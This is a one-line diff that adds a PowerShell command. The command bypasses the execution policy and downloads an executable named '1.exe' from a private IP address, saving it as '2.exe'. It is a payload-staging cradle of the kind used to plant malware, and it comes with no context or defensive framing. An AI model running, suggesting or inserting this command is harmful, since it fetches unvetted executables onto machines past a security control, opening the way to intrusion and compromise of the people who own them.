@@ -1,0 +1,1 @@
+powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.43.111/1.exe','2.exe')
